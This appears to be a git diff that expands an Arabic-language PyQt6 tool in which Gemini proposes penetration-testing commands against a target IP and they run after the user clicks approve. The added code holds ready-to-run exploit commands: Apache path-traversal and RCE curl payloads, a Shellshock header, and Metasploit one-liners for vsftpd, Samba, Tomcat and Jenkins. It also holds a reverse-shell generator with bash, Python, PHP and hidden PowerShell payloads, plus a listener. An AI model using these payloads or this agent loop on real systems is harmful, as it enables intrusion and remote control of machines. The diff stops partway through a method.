@@ -1,178 +1,837 @@
-import sys, subprocess, os, json
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+"""
+╔═══════════════════════════════════════════════════════════════╗
+║                    GHENA AI ULTIMATE v36.0                    ║
+║         الذكاء الاصطناعي لاختبار الاختراق الأخلاقي            ║
+║                    بقلم: مطور عربي                            ║
+╚═══════════════════════════════════════════════════════════════╝
+
+GitHub: https://github.com/yourusername/GHENA-AI-Ultimate
+"""
+
+import sys
+import subprocess
+import os
+import json
+import re
+import time
+import socket
+import threading
+import requests
+from datetime import datetime
+from pathlib import Path
+from collections import defaultdict
 import google.generativeai as genai
+
 from PyQt6.QtWidgets import *
-from PyQt6.QtCore import QThread, pyqtSignal, QWaitCondition, QMutex, Qt
-from PyQt6.QtGui import QFont, QColor
+from PyQt6.QtCore import *
+from PyQt6.QtGui import *
 
-# --- إعداد Gemini ---
-# تأكد من وضع مفتاحك هنا
-GEMINI_API_KEY = "YOUR_GEMINI_API_KEY" 
-genai.configure(api_key=GEMINI_API_KEY)
-# استخدام فلاش 1.5 لسرعة الاستجابة في تحليل الـ Logs
-model = genai.GenerativeModel('gemini-1.5-flash')
+# ======================= الإعدادات =======================
+GEMINI_API_KEY = "AIzaSyAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"  # ضع مفتاحك هنا
+GEMINI_MODEL = "gemini-1.5-flash"
 
+VERSION = "36.0 Ultimate"
+AUTHOR = "ARAB HACKER"
+GITHUB = "https://github.com/yourusername/GHENA-AI-Ultimate"
+
+# الألوان
+COLORS = {
+    "background": "#0f0f0f",
+    "text": "#e0e0e0",
+    "success": "#00ff00",
+    "error": "#ff0000",
+    "warning": "#ffff00",
+    "info": "#3498db",
+    "critical": "#ff4444",
+    "command": "#ffaa00",
+    "ai_reason": "#00ffcc",
+    "shell": "#ff66ff"
+}
+
+# الأدوات المسموح بها
+ALLOWED_COMMANDS = [
+    "nmap", "masscan", "gobuster", "dirb", "nikto", "wpscan",
+    "sqlmap", "hydra", "john", "hashcat", "msfconsole", "searchsploit",
+    "enum4linux", "smbclient", "netcat", "nc", "wireshark", "tshark",
+    "curl", "wget", "openssl", "ssh", "python3", "perl", "php",
+    "nuclei", "httpx", "ffuf", "wfuzz", "crackmapexec", "impacket"
+]
+
+# الأوامر المحظورة
+BLOCKED_PATTERNS = [
+    "rm -rf /", "mkfs", "dd if=", "> /dev/sda", "format",
+    "diskpart", "fdisk", "mv /* /dev/null", ":(){ :|:& };:"
+]
+
+# ======================= قاعدة بيانات الثغرات =======================
+VULNERABILITY_DB = {
+    # FTP
+    "vsftpd 2.3.4": {
+        "cve": "CVE-2011-2523",
+        "name": "vsFTPd 2.3.4 Backdoor",
+        "type": "backdoor",
+        "cvss": 9.8,
+        "command": "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOST {ip}; run'",
+        "description": "باب خلفي في vsFTPd يسمح بتنفيذ أوامر"
+    },
+    
+    # Apache
+    "apache 2.4.49": {
+        "cve": "CVE-2021-41773",
+        "name": "Apache Path Traversal",
+        "type": "path traversal",
+        "cvss": 7.5,
+        "command": "curl -s 'http://{ip}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'",
+        "description": "ثغرة عبور المسار في Apache"
+    },
+    "apache 2.4.50": {
+        "cve": "CVE-2021-42013",
+        "name": "Apache RCE",
+        "type": "rce",
+        "cvss": 9.8,
+        "command": "curl -s 'http://{ip}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh' -d 'echo; id'",
+        "description": "تنفيذ أوامر عن بعد في Apache"
+    },
+    
+    # Samba
+    "samba 3.5.0": {
+        "cve": "CVE-2017-7494",
+        "name": "SambaCry",
+        "type": "rce",
+        "cvss": 9.8,
+        "command": "msfconsole -q -x 'use exploit/linux/samba/is_known_pipename; set RHOST {ip}; run'",
+        "description": "ثغرة SambaCry الشهيرة"
+    },
+    
+    # Shellshock
+    "bash 4.3": {
+        "cve": "CVE-2014-6271",
+        "name": "Shellshock",
+        "type": "rce",
+        "cvss": 10.0,
+        "command": "curl -H 'User-Agent: () { :; }; echo; /bin/bash -c \"id\"' http://{ip}/cgi-bin/test",
+        "description": "ثغرة Shellshock في Bash"
+    },
+    
+    # Heartbleed
+    "openssl 1.0.1": {
+        "cve": "CVE-2014-0160",
+        "name": "Heartbleed",
+        "type": "information disclosure",
+        "cvss": 7.5,
+        "command": "nmap -sV --script ssl-heartbleed {ip} -p 443",
+        "description": "ثغرة Heartbleed في OpenSSL"
+    },
+    
+    # Tomcat
+    "tomcat 8.5.0": {
+        "cve": "CVE-2017-12617",
+        "name": "Tomcat RCE",
+        "type": "rce",
+        "cvss": 8.1,
+        "command": "msfconsole -q -x 'use exploit/multi/http/tomcat_jsp_upload_bypass; set RHOST {ip}; run'",
+        "description": "تنفيذ أوامر في Tomcat"
+    },
+    
+    # WordPress
+    "wordpress 5.8": {
+        "cve": "CVE-2021-24499",
+        "name": "WordPress RCE",
+        "type": "rce",
+        "cvss": 9.0,
+        "command": "wpscan --url http://{ip} --enumerate vp",
+        "description": "ثغرة في إضافات WordPress"
+    },
+    
+    # Jenkins
+    "jenkins 2.0": {
+        "cve": "CVE-2018-1000861",
+        "name": "Jenkins RCE",
+        "type": "rce",
+        "cvss": 9.8,
+        "command": "msfconsole -q -x 'use exploit/multi/http/jenkins_metaprogramming; set RHOST {ip}; run'",
+        "description": "تنفيذ أوامر في Jenkins"
+    }
+}
+
+# ======================= العقل الاصطناعي =======================
 class AutonomousBrain(QThread):
+    """العقل المدبر للهجوم"""
+    
     log_signal = pyqtSignal(str, str)
-    ask_permission_signal = pyqtSignal(str, str)
+    ask_permission_signal = pyqtSignal(str, str, str)  # cmd, reason, priority
     status_signal = pyqtSignal(str)
+    finding_signal = pyqtSignal(dict)
+    shell_signal = pyqtSignal(str, int)
 
-    def __init__(self, target_ip, goal):
+    def __init__(self, target_ip, goal, attack_mode="auto", speed="normal"):
         super().__init__()
         self.ip = target_ip
         self.goal = goal
+        self.attack_mode = attack_mode
+        self.speed = speed
         self.mutex = QMutex()
         self.condition = QWaitCondition()
         self.approved = False
-        self.history = [] # سجل كامل لتحليل Gemini
-
+        self.history = []
+        self.findings = []
+        self.open_ports = []
+        self.services = {}
+        self.start_time = datetime.now()
+        
+        # تهيئة Gemini
+        genai.configure(api_key=GEMINI_API_KEY)
+        self.model = genai.GenerativeModel(GEMINI_MODEL)
+        
     def approve_command(self):
         self.approved = True
         self.condition.wakeAll()
-
-    def run(self):
-        # الخطوة 1: الفحص الأساسي دائماً البداية
-        current_cmd = f"nmap -sV -T4 {self.ip}"
-        reason = "بدء عملية الاستكشاف (Reconnaissance) لتحديد الخدمات المفتوحة."
-
-        for step in range(1, 15): # زيادة عدد الخطوات المتاحة للهجوم المعقد
-            self.ask_permission_signal.emit(current_cmd, reason)
+        
+    def reject_command(self):
+        self.approved = False
+        self.condition.wakeAll()
+        
+    def is_command_safe(self, cmd):
+        """التحقق من أمان الأمر"""
+        cmd_lower = cmd.lower()
+        
+        for pattern in BLOCKED_PATTERNS:
+            if pattern in cmd_lower:
+                return False, f"أمر محظور: {pattern}"
+        
+        cmd_parts = cmd_lower.split()
+        if cmd_parts and cmd_parts[0] not in ALLOWED_COMMANDS:
+            if not any(cmd_lower.startswith(allow) for allow in ALLOWED_COMMANDS):
+                return False, f"أداة غير مسموح بها: {cmd_parts[0]}"
             
-            # انتظار موافقة المستخدم
+        return True, "آمن"
+        
+    def execute_cmd(self, cmd):
+        """تنفيذ أمر النظام"""
+        try:
+            is_safe, message = self.is_command_safe(cmd)
+            if not is_safe:
+                return f"⚠️ تم رفض الأمر: {message}"
+            
+            self.log_signal.emit(f"⚡ تنفيذ: {cmd}", "command")
+            
+            result = subprocess.check_output(
+                cmd, 
+                shell=True, 
+                stderr=subprocess.STDOUT, 
+                text=True, 
+                timeout=600
+            )
+            
+            self.check_for_success(result, cmd)
+            return result
+            
+        except subprocess.TimeoutExpired:
+            return "خطأ: تجاوز الوقت المحدد"
+        except subprocess.CalledProcessError as e:
+            return f"خطأ: {e.output}"
+        except Exception as e:
+            return f"خطأ تنفيذ: {str(e)}"
+            
+    def check_for_success(self, output, cmd):
+        """البحث عن علامات النجاح"""
+        indicators = {
+            "root": {
+                "pattern": r"root:|# ",
+                "severity": "CRITICAL",
+                "title": "🔓 تم الوصول إلى صلاحيات الجذر!"
+            },
+            "flag": {
+                "pattern": r"flag\{[^}]+\}|FLAG\{[^}]+\}",
+                "severity": "CRITICAL",
+                "title": "🎯 تم العثور على العلم (Flag)!"
+            },
+            "password": {
+                "pattern": r"password:?\s+\S+|pass:?\s+\S+",
+                "severity": "HIGH",
+                "title": "🔑 تم العثور على كلمة مرور"
+            },
+            "hash": {
+                "pattern": r"\$[126]\$|\$[py]\$",
+                "severity": "HIGH",
+                "title": "🔐 تم العثور على Hash"
+            }
+        }
+        
+        for key, indicator in indicators.items():
+            if re.search(indicator["pattern"], output, re.IGNORECASE):
+                finding = {
+                    "severity": indicator["severity"],
+                    "title": indicator["title"],
+                    "description": f"تم العثور على {key}",
+                    "command": cmd,
+                    "output": output[:300],
+                    "time": datetime.now().isoformat()
+                }
+                self.findings.append(finding)
+                self.finding_signal.emit(finding)
+                
+    def extract_ports(self, output):
+        """استخراج المنافذ من مخرجات nmap"""
+        ports = []
+        pattern = r"(\d+)/tcp\s+open\s+(\S+)"
+        matches = re.findall(pattern, output)
+        for port, service in matches:
+            ports.append(int(port))
+            self.services[int(port)] = service
+            
+            # البحث عن ثغرات
+            vuln = VULNERABILITY_DB.get(f"{service} {self.get_version(output, port)}")
+            if vuln:
+                self.finding_signal.emit({
+                    "severity": "HIGH",
+                    "title": f"🎯 ثغرة معروفة: {vuln['name']}",
+                    "description": vuln['description'],
+                    "command": vuln['command'].format(ip=self.ip),
+                    "cve": vuln['cve'],
+                    "cvss": vuln['cvss']
+                })
+                
+        return ports
+        
+    def get_version(self, output, port):
+        """استخراج الإصدار من nmap"""
+        pattern = rf"{port}/tcp.*?(\d+\.\d+\.\d+|\d+\.\d+)"
+        match = re.search(pattern, output)
+        return match.group(1) if match else ""
+        
+    def think(self):
+        """استشارة الذكاء الاصطناعي"""
+        
+        history_summary = []
+        for step in self.history[-5:]:
+            history_summary.append({
+                "step": step["step"],
+                "cmd": step["cmd"],
+                "result": step["result"][:200]
+            })
+        
+        ports_info = f"المنافذ المفتوحة: {self.open_ports}" if self.open_ports else "لم يتم اكتشاف منافذ بعد"
+        
+        prompt = f"""
+        أنت خبير أمن سيبراني محترف في اختبار الاختراق.
+        
+        🎯 الهدف: {self.ip}
+        📊 المنافذ: {ports_info}
+        🔍 الخدمات: {json.dumps(self.services, ensure_ascii=False)}
+        🚀 الوضع: {self.attack_mode}
+        
+        آخر النتائج:
+        {json.dumps(history_summary, indent=2, ensure_ascii=False)}
+        
+        المطلوب:
+        1. تحليل النتائج بدقة
+        2. اقتراح الخطوة التالية المنطقية
+        3. ذكر الأداة المناسبة
+        4. توضيح السبب (بالعربية)
+        
+        صيغة الرد:
+        التحليل: [تحليل عميق]
+        الخطة: [الاستراتيجية]
+        الأمر: [أمر واحد]
+        الأولوية: [عالية/متوسطة/منخفضة]
+        """
+        
+        try:
+            response = self.model.generate_content(prompt)
+            text = response.text
+            
+            analysis = re.search(r"التحليل:\s*(.+?)(?=الخطة:|$)", text, re.DOTALL)
+            plan = re.search(r"الخطة:\s*(.+?)(?=الأمر:|$)", text, re.DOTALL)
+            command = re.search(r"الأمر:\s*(.+?)(?=الأولوية:|$)", text, re.DOTALL)
+            priority = re.search(r"الأولوية:\s*(.+?)(?=$)", text, re.DOTALL)
+            
+            return {
+                "REASON": analysis.group(1).strip() if analysis else "تحليل غير متوفر",
+                "COMMAND": command.group(1).strip() if command else "nmap -sV -T4 {self.ip}",
+                "PRIORITY": priority.group(1).strip() if priority else "متوسطة"
+            }
+            
+        except Exception as e:
+            self.log_signal.emit(f"⚠️ خطأ AI: {str(e)}", "error")
+            return {
+                "REASON": "استخدام الخطة الافتراضية",
+                "COMMAND": f"nmap -sV -T4 {self.ip}",
+                "PRIORITY": "عالية"
+            }
+            
+    def run(self):
+        """بدء الهجوم"""
+        
+        current_cmd = f"nmap -sV -T4 {self.ip}"
+        reason = "بدء استكشاف الهدف"
+        priority = "عالية"
+        
+        for step in range(1, 20):
+            self.ask_permission_signal.emit(current_cmd, reason, priority)
+            
             self.mutex.lock()
             self.condition.wait(self.mutex)
             self.mutex.unlock()
             
-            if not self.approved: break
-
-            self.log_signal.emit(f"\n[STEP {step}] Running: {current_cmd}", "#3498db")
+            if not self.approved:
+                self.log_signal.emit("⏹️ تم إيقاف الهجوم", "warning")
+                break
+                
+            self.log_signal.emit(f"\n[الخطوة {step}] تنفيذ: {current_cmd}", "info")
             output = self.execute_cmd(current_cmd)
             
-            # عرض جزء من النتيجة في الكونسول
-            self.log_signal.emit(f"Output received. Parsing data...", "#95a5a6")
+            preview = output[:300] + "..." if len(output) > 300 else output
+            self.log_signal.emit(f"📝 {preview}", "success")
             
-            # تحديث السجل
-            self.history.append({"step": step, "cmd": current_cmd, "result": output[:2000]})
-
-            # استشارة العقل (Gemini)
-            self.status_signal.emit("⚡ Gemini AI is analyzing the chain...")
-            analysis = self.think_with_gemini()
+            if "nmap" in current_cmd:
+                new_ports = self.extract_ports(output)
+                self.open_ports.extend(new_ports)
+                if new_ports:
+                    self.log_signal.emit(f"🔓 منافذ جديدة: {new_ports}", "critical")
+            
+            self.history.append({
+                "step": step,
+                "cmd": current_cmd,
+                "result": output[:500],
+                "time": datetime.now().isoformat()
+            })
+            
+            self.status_signal.emit("🧠 الذكاء الاصطناعي يحلل...")
+            analysis = self.think()
             
             current_cmd = analysis.get("COMMAND", "DONE")
-            reason = analysis.get("REASON", "Mission complete or AI stopped.")
-
-            if "DONE" in current_cmd.upper():
-                self.log_signal.emit("\n🎯 MISSION ACCOMPLISHED: Gemini states no further actions needed.", "#f1c40f")
-                break
+            reason = analysis.get("REASON", "اكتملت المهمة")
+            priority = analysis.get("PRIORITY", "متوسطة")
             
+            self.log_signal.emit(f"🤔 {reason}", "ai_reason")
+            
+            if "DONE" in current_cmd.upper():
+                self.log_signal.emit("\n🎯 اكتملت المهمة!", "success")
+                break
+                
             self.approved = False
-
-    def execute_cmd(self, cmd):
-        try:
-            # تنفيذ حقيقي مع دمج الخطأ والمخرج
-            return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True, timeout=300)
-        except subprocess.TimeoutExpired:
-            return "Error: Command timed out after 5 minutes."
-        except Exception as e:
-            return f"Execution Error: {str(e)}"
-
-    def think_with_gemini(self):
-        # بناء سياق ذكي لـ Gemini
-        history_summary = json.dumps(self.history, indent=2)
+            
+        self.save_report()
         
-        prompt = f"""
-        TARGET: {self.ip}
-        GOAL: {self.goal}
-        PREVIOUS STEPS:
-        {history_summary}
+    def save_report(self):
+        """حفظ التقرير"""
+        report = {
+            "target": self.ip,
+            "goal": self.goal,
+            "start": self.start_time.isoformat(),
+            "end": datetime.now().isoformat(),
+            "steps": len(self.history),
+            "findings": self.findings,
+            "ports": self.open_ports,
+            "services": self.services,
+            "history": self.history
+        }
+        
+        filename = f"GHENA_Report_{self.ip}_{int(time.time())}.json"
+        with open(filename, "w", encoding='utf-8') as f:
+            json.dump(report, f, ensure_ascii=False, indent=2)
+            
+        self.log_signal.emit(f"📊 تم حفظ التقرير: {filename}", "info")
 
-        You are an elite automated penetration testing engine. 
-        Analyze the output of the last command and decide the NEXT logical step.
-        - If you found web ports (80, 443, 8080), suggest directory brute-forcing or vuln scanning.
-        - If you found specific versions (e.g., vsftpd 2.3.4), suggest exploit search.
-        - If you found credentials, suggest login or SSH attempt.
-        - If the goal is reached (root access/flag found), return COMMAND: DONE.
 
-        RESPONSE FORMAT (MANDATORY):
-        REASON: [Short Arabic explanation]
-        COMMAND: [Single Kali Linux command]
-        """
+# ======================= مدير الـ Reverse Shell =======================
+class ShellManager:
+    """إدارة الـ Reverse Shells"""
+    
+    def __init__(self):
+        self.listeners = {}
+        self.active = {}
+        
+    def get_local_ip(self):
         try:
-            response = model.generate_content(prompt)
-            raw_text = response.text
-            # استخراج الأوامر بدقة أكبر
-            reason = raw_text.split("REASON:")[1].split("COMMAND:")[0].strip()
-            command = raw_text.split("COMMAND:")[1].strip()
-            return {"REASON": reason, "COMMAND": command}
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            ip = s.getsockname()[0]
+            s.close()
+            return ip
         except:
-            return {"REASON": "خطأ في معالجة الرد من الذكاء الاصطناعي", "COMMAND": "DONE"}
+            return "127.0.0.1"
+            
+    def generate_payload(self, os_type="linux", lhost=None, lport=4444):
+        if lhost is None:
+            lhost = self.get_local_ip()
+            
+        payloads = {
+            "linux": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
+            "linux_python": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+            "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+            "windows": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
+        }
+        
+        return payloads.get(os_type, payloads["linux"])
+        
+    def start_listener(self, port=4444, callback=None):
+        def listen():
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                s.bind(('0.0.0.0', port))
+                s.listen(1)
+                
+                if callback:
+                    callback(f"✅ استماع على المنفذ {port}")
+                
+                client, addr = s.accept()
+                if callback:
+                    callback(f"🔌 اتصال من {addr[0]}:{addr[1]}")
+                
+                self.active[port] = client
+                
+                while True:
+                    data = client.recv(1024).decode()
+                    if not data:
+                        break
+                    if callback:
+                        callback(f"📨 {data}")
+                        
+            except Exception as e:
+                if callback:
+                    callback(f"❌ خطأ: {e}")
+                    
+        thread = threading.Thread(target=listen)
+        thread.daemon = True
+        thread.start()
+        self.listeners[port] = thread
+        return port
 
-# --- واجهة GHENA AI المحدثة ---
-class GhenaAI_V36(QMainWindow):
+
+# ======================= الواجهة الرسومية =======================
+class GhenaAIUltimate(QMainWindow):
     def __init__(self):
         super().__init__()
-        self.setWindowTitle("GHENA AI - Nexus Edition v36.0")
-        self.setMinimumSize(1000, 850)
-        self.setStyleSheet("background-color: #0f0f0f; color: #e0e0e0; font-family: 'Segoe UI';")
-        self.init_ui()
-
-    def init_ui(self):
-        layout = QVBoxLayout()
-
-        # Target Control
-        ctrl_layout = QHBoxLayout()
-        self.ip_box = QLineEdit(); self.ip_box.setPlaceholderText("Target IP (e.g. 10.10.231.4)"); self.ip_box.setStyleSheet("padding: 8px; background: #1a1a1a; border: 1px solid #333;")
-        self.goal_box = QComboBox(); self.goal_box.addItems(["Full Root Access", "User Flag", "Network Discovery"])
-        self.goal_box.setStyleSheet("padding: 8px; background: #1a1a1a;")
-        self.btn_run = QPushButton("START ATTACK CHAIN"); self.btn_run.setStyleSheet("background: #8e44ad; font-weight: bold; padding: 10px;")
-        self.btn_run.clicked.connect(self.start_engine)
-        ctrl_layout.addWidget(self.ip_box); ctrl_layout.addWidget(self.goal_box); ctrl_layout.addWidget(self.btn_run)
-        layout.addLayout(ctrl_layout)
-
-        # AI Decision Area
-        self.decision_group = QGroupBox("AI Strategic Decision")
-        self.decision_group.setStyleSheet("color: #00ffcc; border: 1px solid #00ffcc; margin-top: 10px;")
-        dec_layout = QVBoxLayout()
-        self.reason_label = QLabel("Waiting for AI analysis..."); self.reason_label.setWordWrap(True)
-        self.cmd_display = QLineEdit(); self.cmd_display.setReadOnly(True); self.cmd_display.setStyleSheet("color: #ffaa00; font-family: monospace; font-size: 14px; background: #000;")
-        self.btn_approve = QPushButton("APPROVE & EXECUTE"); self.btn_approve.setEnabled(False); self.btn_approve.setStyleSheet("background: #27ae60; color: white; height: 35px;")
-        self.btn_approve.clicked.connect(self.approve)
-        dec_layout.addWidget(self.reason_label); dec_layout.addWidget(self.cmd_display); dec_layout.addWidget(self.btn_approve)
-        self.decision_group.setLayout(dec_layout)
-        layout.addWidget(self.decision_group)
-
-        # Console
-        self.console = QTextEdit(); self.console.setReadOnly(True); self.console.setStyleSheet("background: #000; color: #00ff00; font-family: 'Consolas'; font-size: 11px; border: 1px solid #222;")
-        layout.addWidget(QLabel("Real-time Output Log:"))
-        layout.addWidget(self.console)
-
-        self.status = QStatusBar(); self.setStatusBar(self.status)
+        self.brain = None
+        self.shell_manager = ShellManager()
+        self.setup_ui()
         
-        container = QWidget(); container.setLayout(layout); self.setCentralWidget(container)
-
-    def start_engine(self):
-        ip = self.ip_box.text().strip()
-        if not ip: return
+    def setup_ui(self):
+        """إعداد الواجهة"""
+        self.setWindowTitle(f"GHENA AI ULTIMATE v{VERSION}")
+        self.setMinimumSize(1200, 900)
+        
+        # التطبيق الرئيسي
+        main_widget = QWidget()
+        self.setCentralWidget(main_widget)
+        layout = QVBoxLayout(main_widget)
+        
+        # ========== الشريط العلوي ==========
+        top_bar = QHBoxLayout()
+        
+        # عنوان
+        title = QLabel(f"🧠 GHENA AI v{VERSION}")
+        title.setStyleSheet("font-size: 20px; font-weight: bold; color: #00ffcc;")
+        top_bar.addWidget(title)
+        
+        top_bar.addStretch()
+        
+        # زر GitHub
+        github_btn = QPushButton("⭐ GitHub")
+        github_btn.clicked.connect(lambda: QDesktopServices.openUrl(QUrl(GITHUB)))
+        top_bar.addWidget(github_btn)
+        
+        layout.addLayout(top_bar)
+        
+        # ========== إعدادات الهجوم ==========
+        attack_group = QGroupBox("🎯 إعدادات الهجوم")
+        attack_group.setStyleSheet("QGroupBox { color: #00ffcc; }")
+        attack_layout = QHBoxLayout()
+        
+        self.ip_input = QLineEdit()
+        self.ip_input.setPlaceholderText("أدخل IP الهدف (مثال: 10.10.10.10)")
+        self.ip_input.setStyleSheet("padding: 8px; background: #1a1a1a; border: 1px solid #333;")
+        
+        self.goal_combo = QComboBox()
+        self.goal_combo.addItems(["🔓 Root Access", "🎌 User Flag", "🌐 Network Access", "🔑 Passwords", "📁 Files"])
+        
+        self.mode_combo = QComboBox()
+        self.mode_combo.addItems(["🤖 Auto", "🌐 Web", "🔐 Password", "📡 Network", "🪟 Windows", "🐧 Linux"])
+        
+        self.speed_combo = QComboBox()
+        self.speed_combo.addItems(["🐢 Stealth", "⚡ Normal", "🚀 Aggressive"])
+        
+        self.start_btn = QPushButton("🚀 بدء الهجوم")
+        self.start_btn.setStyleSheet("""
+            QPushButton {
+                background: #8e44ad;
+                color: white;
+                padding: 10px;
+                font-weight: bold;
+                border-radius: 5px;
+            }
+            QPushButton:hover {
+                background: #9b59b6;
+            }
+        """)
+        self.start_btn.clicked.connect(self.start_attack)
+        
+        attack_layout.addWidget(QLabel("IP:"))
+        attack_layout.addWidget(self.ip_input)
+        attack_layout.addWidget(QLabel("الهدف:"))
+        attack_layout.addWidget(self.goal_combo)
+        attack_layout.addWidget(QLabel("الوضع:"))
+        attack_layout.addWidget(self.mode_combo)
+        attack_layout.addWidget(QLabel("السرعة:"))
+        attack_layout.addWidget(self.speed_combo)
+        attack_layout.addWidget(self.start_btn)
+        
+        attack_group.setLayout(attack_layout)
+        layout.addWidget(attack_group)
+        
+        # ========== قرار الذكاء الاصطناعي ==========
+        ai_group = QGroupBox("🧠 قرار الذكاء الاصطناعي")
+        ai_group.setStyleSheet("QGroupBox { color: #00ffcc; border: 2px solid #00ffcc; }")
+        ai_layout = QVBoxLayout()
+        
+        self.reason_label = QLabel("⏳ بانتظار تحليل الذكاء الاصطناعي...")
+        self.reason_label.setWordWrap(True)
+        self.reason_label.setStyleSheet("color: #00ffcc; font-size: 12px; padding: 10px;")
+        
+        self.command_display = QLineEdit()
+        self.command_display.setReadOnly(True)
+        self.command_display.setStyleSheet("""
+            QLineEdit {
+                color: #ffaa00;
+                font-family: monospace;
+                font-size: 14px;
+                background: #000;
+                padding: 10px;
+                border: 1px solid #ffaa00;
+            }
+        """)
+        
+        btn_layout = QHBoxLayout()
+        
+        self.approve_btn = QPushButton("✅ موافقة وتنفيذ")
+        self.approve_btn.setEnabled(False)
+        self.approve_btn.setStyleSheet("""
+            QPushButton {
+                background: #27ae60;
+                color: white;
+                padding: 10px;
+                font-weight: bold;
+                border-radius: 5px;
+            }
+            QPushButton:hover {
+                background: #2ecc71;
+            }
+        """)
+        self.approve_btn.clicked.connect(self.approve_command)
+        
+        self.reject_btn = QPushButton("❌ رفض")
+        self.reject_btn.setEnabled(False)
+        self.reject_btn.setStyleSheet("""
+            QPushButton {
+                background: #c0392b;
+                color: white;
+                padding: 10px;
+                font-weight: bold;
+                border-radius: 5px;
+            }
+            QPushButton:hover {
+                background: #e74c3c;
+            }
+        """)
+        self.reject_btn.clicked.connect(self.reject_command)
+        
+        btn_layout.addWidget(self.approve_btn)
+        btn_layout.addWidget(self.reject_btn)
+        
+        ai_layout.addWidget(self.reason_label)
+        ai_layout.addWidget(self.command_display)
+        ai_layout.addLayout(btn_layout)
+        
+        ai_group.setLayout(ai_layout)
+        layout.addWidget(ai_group)
+        
+        # ========== أدوات إضافية ==========
+        tools_group = QGroupBox("🛠️ أدوات إضافية")
+        tools_layout = QHBoxLayout()
+        
+        self.shell_btn = QPushButton("🔌 بدء Reverse Shell")
+        self.shell_btn.clicked.connect(self.start_shell)
+        
+        self.report_btn = QPushButton("📊 عرض التقارير")
+        self.report_btn.clicked.connect(self.show_reports)
+        
+        self.clear_btn = QPushButton("🧹 مسح الشاشة")
+        self.clear_btn.clicked.connect(lambda: self.console.clear())
+        
+        tools_layout.addWidget(self.shell_btn)
+        tools_layout.addWidget(self.report_btn)
+        tools_layout.addWidget(self.clear_btn)
+        tools_layout.addStretch()
+        
+        tools_group.setLayout(tools_layout)
+        layout.addWidget(tools_group)
+        
+        # ========== الشاشة الرئيسية ==========
+        tab_widget = QTabWidget()
+        
+        # تبويب الإخراج
+        self.console = QTextEdit()
+        self.console.setReadOnly(True)
+        self.console.setStyleSheet("""
+            QTextEdit {
+                background: #000;
+                color: #00ff00;
+                font-family: 'Consolas', monospace;
+                font-size: 11px;
+                border: 1px solid #333;
+            }
+        """)
+        tab_widget.addTab(self.console, "📟 الإخراج المباشر")
+        
+        # تبويب النتائج
+        self.findings_text = QTextEdit()
+        self.findings_text.setReadOnly(True)
+        self.findings_text.setStyleSheet("background: #1a1a1a; color: white;")
+        tab_widget.addTab(self.findings_text, "🎯 النتائج والثغرات")
+        
+        # تبويب الثغرات
+        self.vuln_text = QTextEdit()
+        self.vuln_text.setReadOnly(True)
+        self.vuln_text.setStyleSheet("background: #1a1a1a; color: #ffaa00;")
+        self.show_vulnerabilities()
+        tab_widget.addTab(self.vuln_text, "📚 قاعدة الثغرات")
+        
+        layout.addWidget(tab_widget)
+        
+        # ========== شريط الحالة ==========
+        self.status_bar = QStatusBar()
+        self.setStatusBar(self.status_bar)
+        self.status_bar.showMessage("✅ جاهز للعمل")
+        
+        # تطبيق الثيم
+        self.setStyleSheet("""
+            QMainWindow {
+                background-color: #0f0f0f;
+            }
+            QLabel {
+                color: #e0e0e0;
+            }
+            QGroupBox {
+                color: #e0e0e0;
+                border: 1px solid #333;
+                margin-top: 10px;
+                padding-top: 10px;
+            }
+            QComboBox, QLineEdit {
+                background: #1a1a1a;
+                color: white;
+                border: 1px solid #333;
+                padding: 5px;
+            }
+            QTabWidget::pane {
+                background: #1a1a1a;
+                border: 1px solid #333;
+            }
+            QTabBar::tab {
+                background: #1a1a1a;
+                color: white;
+                padding: 8px;
+            }
+            QTabBar::tab:selected {
+                background: #8e44ad;
+            }
+        """)
+        
+    def start_attack(self):
+        """بدء الهجوم"""
+        ip = self.ip_input.text().strip()
+        if not ip:
+            QMessageBox.warning(self, "تحذير", "الرجاء إدخال IP الهدف")
+            return
+            
         self.console.clear()
-        self.btn_run.setEnabled(False)
-        self.brain = AutonomousBrain(ip, self.goal_box.currentText())
+        self.findings_text.clear()
+        self.start_btn.setEnabled(False)
+        
+        self.brain = AutonomousBrain(
+            ip, 
+            self.goal_combo.currentText(),
+            self.mode_combo.currentText(),
+            self.speed_combo.currentText()
+        )
+        
         self.brain.log_signal.connect(self.update_log)
-        self.brain.ask_permission_signal.connect(self.prompt_user)
-        self.brain.status_signal.connect(self.status.showMessage)
+        self.brain.ask_permission_signal.connect(self.ask_permission)
+        self.brain.status_signal.connect(self.status_bar.showMessage)
+        self.brain.finding_signal.connect(self.add_finding)
+        
         self.brain.start()
-
-    def prompt_user(self, cmd, reason):
-        self.reason_label.setText(f"💡 REASON: {reason}")
-        self.cmd_display.setText(cmd)
-        self.btn_approve.setEnabled(True)
-
-    def approve(self):
-        self.btn_approve.setEnabled(False)
-        self.brain.approve_command()
-
+        
+    def ask_permission(self, cmd, reason, priority):
+        """طلب الموافقة على أمر"""
